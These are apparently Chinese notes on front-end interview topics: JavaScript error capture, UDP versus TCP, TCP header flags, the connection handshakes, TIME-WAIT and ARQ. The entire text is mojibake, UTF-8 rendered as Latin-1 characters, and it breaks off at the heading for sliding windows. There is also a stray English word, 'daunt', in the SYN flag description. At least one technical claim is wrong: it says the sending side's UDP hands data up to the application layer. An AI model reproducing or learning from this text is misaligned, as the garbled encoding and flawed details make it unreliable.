å¯¹äºŽæŸäº›æµè§ˆå™¨å¯èƒ½ä¸ä¼šæ˜¾ç¤ºè°ƒç”¨æ ˆä¿¡æ¯ï¼Œè¿™ç§æƒ…å†µå¯ä»¥é€šè¿‡ arguments.callee.caller æ¥åšæ ˆé€’å½’ å¯¹äºŽå¼‚æ­¥ä»£ç æ¥è¯´ï¼Œå¯ä»¥ä½¿ç”¨ catch çš„æ–¹å¼æ•èŽ·é”™è¯¯ã€‚æ¯”å¦‚ Promise å¯ä»¥ç›´æŽ¥ä½¿ç”¨ catch å‡½æ•°ï¼Œasync await å¯ä»¥ä½¿ç”¨ try catch çº¿ä¸Šçš„ä»£ç æ˜¯ç»è¿‡åŽ‹ç¼©çš„ï¼Œæ‰“åŒ…çš„æ—¶å€™è¦è®¾ç½® sourceMap å¸¸è€ƒçš„é¢è¯•é¢˜ç›®ï¼šUDP ä¸Ž TCP çš„åŒºåˆ«æ˜¯ä»€ä¹ˆï¼ŸUDPUDP åè®®æ˜¯é¢å‘æ— è¿žæŽ¥ï¼Œä¸éœ€è¦åœ¨æ­£å¼ä¼ é€’æ•°æ®ä¹‹å‰å…ˆè¿žæŽ¥åŒæ–¹ï¼Œç„¶åŽ UDP åè®®åªæ˜¯æ•°æ®æŠ¥æ–‡çš„æ¬è¿å·¥ï¼Œä¸ä¿è¯æœ‰åºä¸”ä¸ä¸¢å¤±çš„ä¼ é€’åˆ°å¯¹ç«¯ï¼Œå¹¶ä¸” UDP åè®®ä¹Ÿæ²¡æœ‰ä»»ä½•æŽ§åˆ¶æµé‡çš„ç®—æ³•ï¼Œæ€»çš„æ¥è¯´ UDP ç›¸è¾ƒäºŽ TCP æ›´åŠ çš„è½»ä¾¿ é¢å‘æ— è¿žæŽ¥UDP ä¸è¦è·Ÿ TCP ä¸€æ ·åœ¨å‘é€æ•°æ®å‰è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹å»ºç«‹è¿žæŽ¥ï¼Œæƒ³å‘æ•°æ®å°±å¯ä»¥å‘é€äº†ã€‚ å¹¶ä¸”ä¹Ÿåªæ˜¯æ•°æ®çš„æ¬è¿å·¥ï¼Œä¸ä¼šå¯¹æ•°æ®è¿›è¡Œæ‹†åˆ†å’Œæ‹¼æŽ¥æ“ä½œã€‚ å…·ä½“æ¥è¯´ï¼š åœ¨å‘é€ç«¯ï¼Œåº”ç”¨å±‚å°†æ•°æ®ä¼ é€’ç»™ä¼ è¾“å±‚çš„ UDP åè®®ï¼ŒUDP åªä¼šç»™æ•°æ®å¢žåŠ ä¸€ä¸ª UDP å¤´æ ‡è¯†ä¸‹æ˜¯ UDP åè®®ï¼Œç„¶åŽå°±ä¼ é€’ç»™åº”ç”¨å±‚äº† åœ¨æŽ¥æ”¶ç«¯ï¼Œç½‘ç»œå±‚å°†æ•°æ®ä¼ é€’ç»™ä¼ è¾“å±‚ï¼ŒUDP åªåŽ»é™¤ IP æŠ¥æ–‡å¤´å°±ä¼ é€’ç»™åº”ç”¨å±‚ï¼Œä¸ä¼šä»»ä½•æ‹¼æŽ¥æ“ä½œã€‚ ä¸å¯é æ€§ä¸å¯é æ€§ä½“çŽ°åœ¨æ— è¿žæŽ¥ä¸Šï¼Œé€šä¿¡éƒ½ä¸éœ€è¦å»ºç«‹è¿žæŽ¥ï¼Œæƒ³å‘å°±å‘ã€‚ä¸ç”¨å¤‡ä»½ï¼Œä¹Ÿä¸ç”¨å…³å¿ƒå¯¹æ–¹æ˜¯å¦å·²ç»æ­£ç¡®æŽ¥æ”¶åˆ°æ•°æ®ã€‚UDP æ²¡æœ‰æ‹¥å¡žæŽ§åˆ¶ï¼Œä¸€ç›´ä¼šä»¥æ’å®šçš„é€Ÿåº¦å‘é€æ•°æ®ï¼Œå³ä½¿ç½‘ç»œæ¡ä»¶ä¸å¥½ï¼Œä¹Ÿä¸ä¼šå¯¹å‘é€é€ŸçŽ‡è¿›è¡Œè°ƒæ•´ã€‚è¿™æ ·å®žçŽ°çš„å¼Šç«¯æ˜¯åœ¨ç½‘ç»œæ¡ä»¶ä¸å¥½çš„æƒ…å†µä¸‹å¯èƒ½ä¼šå¯¼è‡´ä¸¢åŒ…ï¼Œä½†æ˜¯ä¼˜ç‚¹å¾ˆæ˜Žæ˜¾æ˜¯åœ¨æŸäº›å®žæ—¶æ€§è¦æ±‚å¾ˆé«˜çš„åœºæ™¯ï¼ˆå¦‚ç”µè¯ä¼šè®®ï¼‰å°±éœ€è¦ä½¿ç”¨ UDP è€Œä¸æ˜¯ TCP é«˜æ•ˆUDP çš„å¤´éƒ¨å¼€é”€å°ï¼Œåªæœ‰å…«å­—èŠ‚ï¼Œç›¸æ¯” TCP çš„è‡³å°‘äºŒåå­—èŠ‚è¦å°å¾—å¤šï¼Œåœ¨ä¼ è¾“æ•°æ®æŠ¥æ–‡æ—¶æ˜¯å¾ˆé«˜æ•ˆçš„ã€‚ UDP å¤´éƒ¨åŒ…å«äº†ä»¥ä¸‹å‡ ä¸ªæ•°æ®ï¼š ä¸¤ä¸ªåå…­ä½çš„ç«¯å£å·ï¼Œåˆ†åˆ«ä¸ºæºç«¯å£ï¼ˆå¯é€‰å­—æ®µï¼‰å’Œç›®æ ‡ç«¯å£ æ•´ä¸ªæ•°æ®æŠ¥æ–‡çš„é•¿åº¦ æ•´ä¸ªæ•°æ®æŠ¥æ–‡çš„æ£€éªŒå’Œï¼ˆIPv4 å¯é€‰å­—æ®µï¼‰ï¼Œè¯¥å­—æ®µç”¨äºŽå‘çŽ°å¤´éƒ¨ä¿¡æ¯å’Œæ•°æ®ä¸­çš„é”™è¯¯ ä¼ è¾“æ–¹å¼UDP ä¸æ­¢æ”¯æŒä¸€å¯¹ä¸€çš„ä¼ è¾“æ–¹å¼ï¼ŒåŒæ ·æ”¯æŒä¸€å¯¹å¤šï¼Œå¤šå¯¹ä¸€çš„æ–¹å¼ï¼Œä¹Ÿå°±è¯´è¯´ UDP æä¾›äº†å•æ’­ï¼Œå¤šæ’­ï¼Œå¹¿æ’­çš„åŠŸèƒ½ã€‚ é€‚ç”¨çš„åœºæ™¯åœ¨å¾ˆå¤šå®žæ—¶æ€§è¦æ±‚å¾ˆé«˜çš„åœ°æ–¹éƒ½å¯ä»¥çœ‹åˆ° UDP çš„èº«å½± ç›´æ’­å¦‚æžœä½¿ç”¨åŸºäºŽ TCP çš„åè®®ï¼ŒTCP ä¼šä¸¥æ ¼æŽ§åˆ¶ä¼ è¾“çš„æ­£ç¡®æ€§ï¼Œä¸€æ—¦æœ‰æŸä¸ªæ•°æ®å¯¹ç«¯æ²¡æœ‰æ”¶åˆ°ï¼Œå°±ä¼šåœä¸‹æ¥ç›´åˆ°å¯¹ç«¯æ”¶åˆ°è¿™ä¸ªæ•°æ®ã€‚è¿™ç§é—®é¢˜åœ¨ç½‘ç»œæ¡ä»¶ä¸é”™çš„æƒ…å†µä¸‹ä¸ä¼šæœ‰é—®é¢˜ï¼Œä½†æ˜¯å¦‚æžœç½‘ç»œå·®å°±ä¼šå˜æˆç”»é¢å¡ç€ï¼Œç„¶åŽåœ¨ç»§ç»­æ’­æ”¾ä¸‹ä¸€å¸§çš„æƒ…å†µã€‚ TCP è¿™ç§æƒ…å†µä¸‹ä¼šé™ä½Žç”¨æˆ·ä½“éªŒï¼Œä¸é€‚åˆ çŽ‹è€…è£è€€ä½œè€…è¯´ä¸çŸ¥é“çŽ‹è€…è£è€€åº•å±‚æ˜¯ä½¿ç”¨äº†ä»€ä¹ˆåè®®ï¼Œä½†æ˜¯å¯¹äºŽè¿™ç§å®žæ—¶æ€§å¾ˆé«˜çš„æ¸¸æˆæ¥è¯´ï¼ŒUDP æ˜¯è·‘ä¸äº†çš„ã€‚ç”¨æˆ·ä½“é‡ç›¸å½“å¤§çš„æƒ…å†µä¸‹ï¼Œå¦‚æžœä½¿ç”¨ TCP è¿žæŽ¥å¯èƒ½ä¼šå‡ºçŽ°æœåŠ¡å™¨ä¸å¤Ÿç”¨æƒ…å†µï¼Œå› ä¸ºæ¯å°æœåŠ¡å™¨å¯ä¾›æ”¯æ’‘çš„ TCP è¿žæŽ¥æ•°æ®æ˜¯æœ‰é™åˆ¶çš„ã€‚ TCP å¯¹äºŽTCP å¤´éƒ¨æ¥è¯´ï¼Œä»¥ä¸‹å‡ ä¸ªå­—æ®µæ˜¯å¾ˆé‡è¦çš„ Sequence numberï¼Œè¿™ä¸ªåºå·ä¿è¯äº† TCP ä¼ è¾“çš„æŠ¥æ–‡éƒ½æ˜¯æœ‰åºçš„ï¼Œå¯¹ç«¯å¯ä»¥é€šè¿‡åºå·é¡ºåºçš„æ‹¼æŽ¥æŠ¥æ–‡ Acknowledgement Numberï¼Œè¿™ä¸ªåºå·è¡¨ç¤ºæ•°æ®æŽ¥æ”¶ç«¯æœŸæœ›æŽ¥å—çš„ä¸‹ä¸€ä¸ªå­—èŠ‚ç¼–å·æ˜¯å¤šå°‘ï¼ŒåŒæ—¶ä¹Ÿè¡¨ç¤ºä¸Šä¸€åºå·çš„æ•°æ®å·²ç»æ”¶åˆ° Window Size,çª—å£å¤§å°ï¼Œè¡¨ç¤ºè¿˜èƒ½æŽ¥å—å¤šå°‘å­—èŠ‚çš„æ•°æ®ï¼Œç”¨äºŽæµé‡æŽ§åˆ¶ æ ‡è¯†ç¬¦ UGR=1ï¼šè¯¥å­—æ®µä¸ºä¸€è¡¨ç¤ºæœ¬æ•°æ®æŠ¥çš„æ•°æ®éƒ¨åˆ†åŒ…å«ç´§æ€¥ä¿¡æ¯ï¼Œæ˜¯ä¸€ä¸ªé«˜ä¼˜å…ˆçº§æ•°æ®æŠ¥æ–‡ï¼Œæ­¤æ—¶ç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆã€‚ç´§æ€¥æ•°æ®ä¸€å®šä½äºŽå½“å‰æ•°æ®åŒ…æ•°æ®éƒ¨åˆ†çš„æœ€å‰é¢ï¼Œç´§æ€¥æŒ‡æ ‡æ ‡æ˜Žäº†ç´§æ€¥æ•°æ®çš„å°¾éƒ¨ã€‚ ACK=1ï¼šè¯¥å­—æ®µä¸ºä¸€è¡¨ç¤ºç¡®è®¤å·å­—æ®µæœ‰æ•ˆã€‚æ­¤å¤–ï¼ŒTCP è¿˜è§„å®šåœ¨è¿žæŽ¥å»ºç«‹åŽä¼ é€çš„æ‰€æœ‰æŠ¥æ–‡æ®µéƒ½å¿…é¡»è¦æŠŠ ACK ç½®ä¸ºä¸€ PSH=1ï¼šè¯¥å­—æ®µä¸ºä¸€è¡¨ç¤ºæŽ¥æ”¶ç«¯åº”è¯¥ç«‹å³å°†æ•°æ® push ç»™åº”ç”¨å±‚ï¼Œè€Œä¸æ˜¯ç­‰åˆ°ç¼“å†²åŒºæ»¡åŽå†æäº¤ RST=1ï¼šè¯¥å­—æ®µä¸ºä¸€è¡¨ç¤ºå½“å‰ TCP è¿žæŽ¥å‡ºçŽ°ä¸¥é‡é—®é¢˜ï¼Œå¯èƒ½éœ€è¦é‡æ–°å»ºç«‹è¿žæŽ¥ï¼Œä¹Ÿå¯ä»¥ç”¨äºŽæ‹’ç»éžæ³•çš„æŠ¥æ–‡æ®µå’Œæ‹’ç»è¿žæŽ¥è¯·æ±‚ SYN=1ï¼šå½“ SYN = 1,ACK=0æ—¶ï¼Œè¡¨ç¤ºå½“å‰æŠ¥æ–‡æ®µæ˜¯ä¸€ä¸ªè¿žæŽ¥è¯·æ±‚æŠ¥æ–‡ã€‚å½“ SYN=1,ACK=1æ—¶ï¼Œè¡¨ç¤ºå½“å‰æŠ¥æ–‡dauntæ˜¯ä¸€ä¸ªåŒæ„è¿žæŽ¥çš„åº”ç­”æŠ¥æ–‡ FIN=1ï¼šè¯¥å­—æ®µä¸ºä¸€è¡¨ç¤ºæ­¤æŠ¥æ–‡æ˜¯ä¸€ä¸ªé‡Šæ”¾è¿žæŽ¥çš„è¯·æ±‚æŠ¥æ–‡ çŠ¶æ€æœºTCP çš„çŠ¶æ€æœºæ˜¯å¾ˆå¤æ‚çš„ï¼Œå¹¶ä¸”ä¸Žå»ºç«‹è¿žæŽ¥æ—¶çš„æ¡æ‰‹æ¯æ¯ç›¸å…³ ä¸€ä¸ªé‡è¦çš„æ€§èƒ½æŒ‡æ ‡ RTT.è¯¥æŒ‡æ ‡è¡¨ç¤ºå‘é€ç«¯å‘é€æ•°æ®åˆ°æŽ¥æ”¶åˆ°å¯¹ç«¯æ‰€éœ€çš„å¾€è¿”æ—¶é—´ å»ºç«‹è¿žæŽ¥ä¸‰æ¬¡æ¡æ‰‹ é¦–å…ˆå‡è®¾ä¸»åŠ¨å‘èµ·è¯·æ±‚çš„ä¸€ç«¯ä¸ºå®¢æˆ·ç«¯ï¼Œè¢«åŠ¨è¿žæŽ¥çš„ä¸€ç«¯ç§°ä¸ºæœåŠ¡ç«¯ã€‚ä¸ç®¡æ˜¯å®¢æˆ·ç«¯è¿˜æ˜¯æœåŠ¡ç«¯ï¼ŒTCP è¿žæŽ¥å»ºç«‹å®ŒåŽéƒ½å¯ä»¥å‘é€å’ŒæŽ¥æ”¶æ•°æ®ï¼Œæ‰€ä»¥ TCP æ˜¯ä¸€ä¸ªå…¨åŒå·¥çš„åè®®ã€‚ èµ·åˆï¼Œä¸¤ç«¯éƒ½æ˜¯ CLOSED çŠ¶æ€ï¼Œåœ¨é€šä¿¡å¼€å§‹å‰ï¼ŒåŒæ–¹éƒ½ä¼šå»ºç«‹ TCB,æœåŠ¡ç«¯åˆ›å»ºå®ŒTCB åŽä¾¿è¿›å…¥ LISTEN çŠ¶æ€ï¼Œæ­¤æ—¶å¼€å§‹ç­‰å¾…å®¢æˆ·ç«¯å‘é€æ•°æ® ç¬¬ä¸€æ¬¡æ¡æ‰‹å®¢æˆ·ç«¯å‘æœåŠ¡ç«¯å‘é€è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼Œè¯¥æŠ¥æ–‡æ®µä¸­åŒ…å«è‡ªèº«æ•°æ®é€šè®¯åˆå§‹åºå·ã€‚è¯·æ±‚å‘é€åŽï¼Œå®¢æˆ·ç«¯ä¾¿è¿›å…¥ SYN-SENT çŠ¶æ€ ç¬¬äºŒæ¬¡æ¡æ‰‹æœåŠ¡ç«¯æ”¶åˆ°è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡æ®µåŽï¼Œå¦‚æžœåŒæ„è¿žæŽ¥ï¼Œåˆ™ä¼šå‘é€ä¸€ä¸ªåº”ç­”ï¼Œè¯¥åº”ç­”ä¸­ä¹Ÿä¼šåŒ…å«è‡ªèº«çš„æ•°æ®é€šè®¯åˆå§‹åºå·ï¼Œå‘é€å®ŒæˆåŽä¾¿è¿›å…¥ SYN-RECEIVED çŠ¶æ€ã€‚ ç¬¬ä¸‰æ¬¡æ¡æ‰‹å½“å®¢æˆ·ç«¯æ”¶åˆ°è¿žæŽ¥åŒæ„çš„åº”ç­”åŽï¼Œè¿˜è¦å‘æœåŠ¡ç«¯å‘é€ä¸€ä¸ªç¡®è®¤æŠ¥æ–‡ã€‚å®¢æˆ·ç«¯å‘å®Œè¿™ä¸ªæŠ¥æ–‡æ®µåŽä¾¿è¿›å…¥ ESTABLISHED çŠ¶æ€ï¼ŒæœåŠ¡ç«¯æŽ¥æ”¶åˆ°è¿™ä¸ªåº”ç­”åŽä¹Ÿè¿›å…¥ ESTABLISHED çŠ¶æ€ï¼Œæ­¤æ—¶è¿žæŽ¥å»ºç«‹æˆåŠŸ ç¬¬ä¸‰æ¬¡æ¡æ‰‹ä¸­å¯ä»¥åŒ…å«æ•°æ®ï¼Œé€šè¿‡å¿«é€Ÿæ‰“å¼€ï¼ˆTFOï¼‰æŠ€æœ¯å°±å¯ä»¥å®žçŽ°è¿™ä¸€åŠŸèƒ½ã€‚å…¶ä¸­åªè¦æ¶‰åŠåˆ°æ¡æ‰‹çš„åè®®ï¼Œéƒ½å¯ä»¥ä½¿ç”¨ç±»ä¼¼ TFO æ–¹å¼ï¼Œå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å­˜å‚¨ç›¸åŒçš„ cookie ï¼Œä¸‹æ¬¡æ¡æ‰‹å‘å‡º cookie è¾¾åˆ°å‡å°‘ RTT çš„ç›®çš„ã€‚ ä¸ºä»€ä¹ˆTCP å»ºç«‹è¿žæŽ¥éœ€è¦ä¸‰æ¬¡æ¡æ‰‹ï¼Œæ˜Žæ˜Žä¸¤æ¬¡å°±å¯ä»¥å»ºç«‹èµ·è¿žæŽ¥ï¼Ÿ å› ä¸ºè¿™æ˜¯ä¸ºäº†é˜²æ­¢å‡ºçŽ°å¤±æ•ˆçš„è¿žæŽ¥è¯·æ±‚æŠ¥æ–‡æ®µè¢«æœåŠ¡ç«¯æŽ¥æ”¶åŽï¼Œä»Žè€Œäº§ç”Ÿé”™è¯¯ã€‚ å¦‚æžœå®¢æˆ·ç«¯å‘é€äº†ä¸€ä¸ªè¿žæŽ¥æŠ¥æ–‡è¯·æ±‚Aï¼Œä½†æ˜¯å› ä¸ºç½‘ç»œåŽŸå› é€ æˆäº†è¶…æ—¶ï¼Œè¿™æ—¶ TCP ä¼šå¯åŠ¨è¶…æ—¶é‡ä¼ çš„æœºåˆ¶å†æ¬¡å‘é€ä¸€ä¸ªè¿žæŽ¥è¯·æ±‚æŠ¥æ–‡Bã€‚æ­¤æ—¶è¯·æ±‚é¡ºåˆ©è¾¾åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡ç«¯åº”ç­”å®Œå°±å»ºç«‹äº†è¯·æ±‚ï¼Œç„¶åŽæŽ¥å—æ•°æ®åŽé‡Šæ”¾äº†è¿žæŽ¥ã€‚ å‡è®¾è¿™æ—¶å€™è¯·æ±‚ A åœ¨ä¸¤ç«¯å…³é—­åŽç»ˆäºŽè¾¾åˆ°äº†æœåŠ¡ç«¯ï¼Œé‚£ä¹ˆæ­¤æ—¶æœåŠ¡ç«¯ä¼šè®¤ä¸ºå®¢æˆ·ç«¯æœ‰éœ€è¦å»ºç«‹ TCP è¿žæŽ¥ï¼Œä»Žè€Œåº”ç­”äº†è¯¥è¯·æ±‚å¹¶è¿›å…¥äº† ESTABLISHED çŠ¶æ€ï¼Œä½†æ˜¯å®žé™…ä¸Šå®¢æˆ·ç«¯æ˜¯ CLOSED çŠ¶æ€ï¼Œé‚£ä¹ˆå°±ä¼šå¯¼è‡´æœåŠ¡ç«¯ä¸€ç›´ç­‰å¾…ï¼Œé€ æˆèµ„æºçš„æµªè´¹ã€‚ åœ¨å»ºç«‹è¿žæŽ¥ä¸­ï¼Œä»»æ„ä¸€ç«¯æŽ‰çº¿ï¼ŒTCP éƒ½ä¼šé‡å‘ SYN åŒ…ï¼Œä¸€èˆ¬ä¼šé‡è¯•5æ¬¡ï¼Œåœ¨å»ºç«‹è¿žæŽ¥å¯èƒ½é‡åˆ° SYN Flood æ”»å‡»ã€‚é‡åˆ°è¿™ç§æƒ…å†µå¯ä»¥é€‰æ‹©è°ƒä½Žé‡è¯•æ¬¡æ•°æˆ–è€…å¹²è„†åœ¨ä¸èƒ½å¤„ç†çš„æƒ…å†µä¸‹æ‹’ç»è¯·æ±‚ã€‚ æ–­å¼€è¿žæŽ¥å››æ¬¡æ¡æ‰‹ TCP æ˜¯å…¨åŒå·¥çš„ï¼Œåœ¨æ–­å¼€è¿žæŽ¥æ—¶ä¸¤ç«¯éƒ½éœ€è¦å‘é€ FIN å’Œ ACK ç¬¬ä¸€æ¬¡æ¡æ‰‹è‹¥å®¢æˆ·ç«¯ A è®¤ä¸ºæ•°æ®å‘é€å®Œæˆï¼Œåˆ™å®ƒéœ€è¦å‘æœåŠ¡ç«¯ B å‘é€è¿žæŽ¥é‡Šæ”¾è¯·æ±‚ã€‚ ç¬¬äºŒæ¬¡æ¡æ‰‹B æ”¶åˆ°è¿žæŽ¥é‡Šæ”¾è¯·æ±‚åŽï¼Œä¼šå‘Šè¯‰åº”ç”¨å±‚å°±è¦é‡Šæ”¾ TCP è¿žæŽ¥ï¼Œç„¶åŽä¼šå‘é€ ACK åŒ…ï¼Œå¹¶è¿›å…¥ CLOSE_WAIT çŠ¶æ€ï¼Œæ­¤æ—¶è¡¨æ˜Ž A åˆ° B çš„è¿žæŽ¥å·²ç»é‡Šæ”¾ï¼Œä¸å†æŽ¥æ”¶ A å‘çš„æ•°æ®äº†ã€‚ä½†æ˜¯å› ä¸º TCP è¿žæŽ¥æ˜¯åŒå·¥çš„ï¼Œæ‰€ä»¥ B ä¾æ—§å¯ä»¥å‘é€æ•°æ®ç»™ A ç¬¬ä¸‰æ¬¡æ¡æ‰‹B å¦‚æžœæ­¤æ—¶è¿˜æœ‰æ²¡æœ‰å‘å®Œçš„æ•°æ®ä¼šç»§ç»­å‘é€ï¼Œå®Œæ¯•åŽå‘ A å‘é€è¿žæŽ¥é‡Šæ”¾è¯·æ±‚ï¼Œç„¶åŽ B ä¾¿è¿›å…¥ LAST-ACK çŠ¶æ€ã€‚é€šè¿‡å»¶è¿Ÿç¡®è®¤çš„æŠ€æœ¯ï¼ˆé€šå¸¸æœ‰æ—¶é—´é™åˆ¶ï¼Œå¦åˆ™å¯¹æ–¹ä¼šè¯¯è®¤ä¸ºéœ€è¦é‡ä¼ ï¼‰ï¼Œå¯ä»¥å°†ç¬¬äºŒæ¬¡å’Œç¬¬ä¸‰æ¬¡æ¡æ‰‹åˆå¹¶ï¼Œå»¶è¿Ÿ ACK åŒ…çš„å‘é€ ç¬¬å››æ¬¡æ¡æ‰‹A æ”¶åˆ°é‡Šæ”¾è¯·æ±‚åŽï¼Œå‘ B å‘é€ç¡®è®¤åº”ç­”ï¼ŒA è¿›å…¥ TIME-WAIT çŠ¶æ€ã€‚è¯¥çŠ¶æ€ä¼šæŒç»­ 2MSL(æœ€å¤§ç”Ÿå­˜æœŸï¼ŒæŒ‡æŠ¥æ–‡æ®µåœ¨ç½‘ç»œä¸­ç”Ÿå­˜çš„æ—¶é—´ï¼Œè¶…æ—¶ä¼šè¢«æŠ›å¼ƒ)æ—¶é—´ï¼Œè‹¥è¯¥æ—¶é—´æ®µå†…æ²¡æœ‰ B çš„é‡å‘è¯·æ±‚çš„è¯ï¼Œå°±ä¼šè¿›å…¥ CLOSED çŠ¶æ€ã€‚å½“ B æ”¶åˆ°ç¡®è®¤åº”ç­”åŽï¼Œä¹Ÿä¾¿è¿›å…¥ CLOSED çŠ¶æ€ ä¸ºä»€ä¹ˆ A è¦è¿›å…¥ TIME-WAIT çŠ¶æ€ï¼Œç­‰å¾… 2MSL æ—¶é—´åŽå†è¿›å…¥CLOSED çŠ¶æ€ï¼Ÿ ä¸ºäº†ä¿è¯ B èƒ½æŽ¥å—åˆ° A çš„ç¡®è®¤åº”ç­”ï¼Œè‹¥ A å‘å®Œç¡®è®¤åº”ç­”åŽç›´æŽ¥è¿›å…¥ CLOSED çŠ¶æ€ï¼Œå¦‚æžœç¡®è®¤åº”ç­”å› ä¸ºç½‘ç»œé—®é¢˜ä¸€ç›´æ²¡æœ‰åˆ°è¾¾ï¼Œé‚£ä¹ˆä¼šé€ æˆ B ä¸èƒ½æ­£å¸¸å…³é—­ ARQ åè®®ARQ åè®®ä¹Ÿå°±æ˜¯è¶…æ—¶é‡ä¼ æœºåˆ¶ã€‚é€šè¿‡ç¡®è®¤å’Œè¶…æ—¶æœºåˆ¶ä¿è¯äº†æ•°æ®çš„æ­£ç¡®é€è¾¾ï¼ŒARQ åè®®åŒ…å«åœæ­¢ç­‰å¾… ARQ å’Œè¿žç»­ ARQ ä¸¤ç§åè®® åœæ­¢ç­‰å¾… ARQæ­£å¸¸ä¼ è¾“åè®®åªè¦ A å‘ B å‘é€ä¸€æ®µæŠ¥æ–‡ï¼Œéƒ½è¦åœæ­¢å‘é€å¹¶ä¸”å¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç­‰å¾…å¯¹ç«¯åº”ç­”ï¼Œåœ¨å®šæ—¶å™¨å†…æŽ¥æ”¶åˆ°å¯¹ç«¯åº”ç­”å°±å–æ¶ˆå®šæ—¶å™¨å¹¶å‘é€ä¸‹ä¸€æ®µæŠ¥æ–‡ æŠ¥æ–‡ä¸¢å¤±æˆ–è€…å‡ºé”™åœ¨æŠ¥æ–‡ä¼ è¾“è¿‡ç¨‹ä¸­å¯èƒ½ä¼šå‡ºçŽ°ä¸¢åŒ…ï¼Œè¿™æ—¶å€™è¶…è¿‡å®šæ—¶å™¨è®¾å®šçš„æ—¶é—´å°±ä¼šå†æ¬¡å‘é€ä¸¢å¤±çš„æ•°æ®ç›´åˆ°å¯¹ç«¯å“åº”ï¼Œæ‰€ä»¥éœ€è¦æ¯æ¬¡éƒ½å¤‡ä»½å‘é€çš„æ•°æ® å³ä½¿æŠ¥æ–‡æ­£å¸¸ä¼ è¾“åˆ°å¯¹ç«¯ï¼Œæœ‰å¯èƒ½å‡ºçŽ°åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„æŠ¥æ–‡å‡ºé”™çš„é—®é¢˜ã€‚è¿™æ—¶å€™å¯¹ç«¯ä¼šæŠ›å¼ƒè¯¥æŠ¥æ–‡å¹¶ç­‰å¾… A ç«¯é‡ä¼  ä¸€èˆ¬å®šæ—¶å™¨è®¾å®šçš„æ—¶é—´ä¼šå¤§äºŽä¸€ä¸ª RTT çš„å¹³å‡æ—¶é—´ ACK è¶…æ—¶æˆ–è€…ä¸¢å¤±å¯¹ç«¯ä¼ è¾“çš„åº”ç­”ä¹Ÿå¯èƒ½å‡ºçŽ°ä¸¢å¤±æˆ–è€…è¶…æ—¶çš„æƒ…å†µï¼Œé‚£ä¹ˆè¶…è¿‡å®šæ—¶å™¨æ—¶é—´ A ç«¯ç…§æ ·ä¼šé‡æŠ¥æ–‡ï¼Œè¿™æ—¶å€™ B ç«¯ä¼šæŽ¥æ”¶åˆ°ç›¸åŒåºå·çš„æŠ¥æ–‡ä¹‹åŽä¸¢å¼ƒè¯¥æŠ¥æ–‡å¹¶é‡ä¼ åº”ç­”ï¼Œç›´åˆ° A ç«¯å‘é€ä¸‹ä¸€ä¸ªåºå·çš„æŠ¥æ–‡ã€‚ åœ¨è¶…æ—¶çš„æƒ…å†µä¸‹ä¹Ÿå¯èƒ½ä¼šå‡ºçŽ°åº”ç­”å¾ˆè¿Ÿåˆ°è¾¾ï¼Œè¿™æ—¶å€™ A ç«¯ä¼šåˆ¤æ–­è¯¥åºå·æ˜¯å¦å·²ç»æŽ¥æ”¶è¿‡ï¼Œå¦‚æžœæŽ¥æ”¶è¿‡åªéœ€è¦ä¸¢å¼ƒåº”ç­”å³å¯ã€‚ å‡è®¾åœ¨è‰¯å¥½çš„ç½‘ç»œçŽ¯å¢ƒä¸­ï¼Œæ¯æ¬¡å‘é€æ•°æ®éƒ½éœ€è¦ç­‰å¾…ç‰‡åˆ»è‚¯å®šæ˜¯ä¸èƒ½æŽ¥å—çš„ï¼Œè¿™ä¸ªåè®®çœ‹èµ·æ¥ä¸æ˜¯å¾ˆé«˜æ•ˆã€‚ è¿žç»­ARQåœ¨è¿žç»­ ARQ ä¸­ï¼Œå‘é€ç«¯æ‹¥æœ‰ä¸€ä¸ªå‘é€çª—å£ï¼Œå¯ä»¥åœ¨æ²¡æœ‰æ”¶åˆ°åº”ç­”çš„æƒ…å†µä¸‹æŒç»­å‘é€çª—å£å†…çš„æ•°æ®ï¼Œè¿™æ ·ç›¸æ¯”åœæ­¢ç­‰å¾… ARQ åè®®æ¥è¯´å‡å°‘äº†ç­‰å¾…æ—¶é—´ï¼Œæé«˜äº†æ•ˆçŽ‡ ç´¯è®¡ç¡®è®¤è¿žç»­ ARQ ä¸­ï¼ŒæŽ¥æ”¶ç«¯ä¼šæŒç»­ä¸æ–­æ”¶åˆ°æŠ¥æ–‡ï¼Œå¦‚æžœå’Œåœæ­¢ç­‰å¾… ARQ ä¸­æŽ¥æ”¶ä¸€ä¸ªæŠ¥æ–‡å°±å‘é€ä¸€ä¸ªåº”ç­”ä¸€æ ·ï¼Œå°±å¤ªæµªè´¹èµ„æºäº†ã€‚é€šè¿‡ç´¯è®¡ç¡®è®¤ï¼Œå¯ä»¥åœ¨æ”¶åˆ°å¤šä¸ªæŠ¥æ–‡ä»¥åŽç»Ÿä¸€å›žå¤ä¸€ä¸ªåº”ç­”æŠ¥æ–‡ã€‚æŠ¥æ–‡ä¸­çš„ ACK æ ‡ç¤ºä½å¯ä»¥ç”¨æ¥å‘Šè¯‰å‘é€ç«¯è¿™ä¸ªåºå·ä¹‹å‰çš„æ•°æ®å·²ç»å…¨éƒ¨æŽ¥æ”¶åˆ°äº†ï¼Œä¸‹æ¬¡è¯·å‘é€è¿™ä¸ªåºå·åŽçš„æ•°æ®ã€‚ ä½†æ˜¯ç´¯è®¡ç¡®è®¤ä¹Ÿæœ‰ä¸€ä¸ªå¼Šç«¯ï¼Œåœ¨è¿žç»­æŽ¥æ”¶æŠ¥æ–‡æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°æŽ¥æ”¶åˆ°åºå·5 çš„æŠ¥æ–‡åŽï¼Œå¹¶æœªæŽ¥æ”¶åˆ°åºå·6 çš„æŠ¥æ–‡ï¼Œç„¶è€Œåºå·7 çš„æŠ¥æ–‡å·²ç»æŽ¥æ”¶ã€‚é‡åˆ°è¿™ç§æƒ…å†µï¼ŒACK åªèƒ½å›žå¤ 6ï¼Œè¿™æ ·å°±ä¼šé€ æˆå‘é€ç«¯é‡å¤å‘é€æ•°æ®çš„æƒ…å†µã€‚ æ»‘åŠ¨çª—å£TCP 